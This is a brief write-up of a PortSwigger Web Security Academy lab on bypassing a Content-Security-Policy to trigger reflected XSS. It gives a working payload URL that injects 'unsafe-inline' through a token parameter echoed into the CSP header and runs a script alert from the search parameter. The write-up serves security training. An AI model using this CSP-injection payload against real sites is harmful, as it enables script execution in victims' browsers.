# EXPERT: Reflected XSS protected by CSP, with CSP bypass

```jsx
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
```

![Снимок экрана 2025-12-01 в 11.41.55.png](EXPERT%20Reflected%20XSS%20protected%20by%20CSP,%20with%20CSP%20by/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_11.41.55.png)

Notice the following request after using search function. Token parameter gets reflected in a `Content-Security-Policy` HTTP header. Thus, we can inject our own unsafe policy.

![Снимок экрана 2025-12-01 в 11.44.43.png](EXPERT%20Reflected%20XSS%20protected%20by%20CSP,%20with%20CSP%20by/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_11.44.43.png)

Now just add the payload in the search param itself and done.

![Снимок экрана 2025-12-01 в 11.47.51.png](EXPERT%20Reflected%20XSS%20protected%20by%20CSP,%20with%20CSP%20by/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_11.47.51.png)

https://systemweakness.com/portswigger-academy-reflected-xss-protected-by-csp-with-csp-bypass-write-up-5954a67dbdea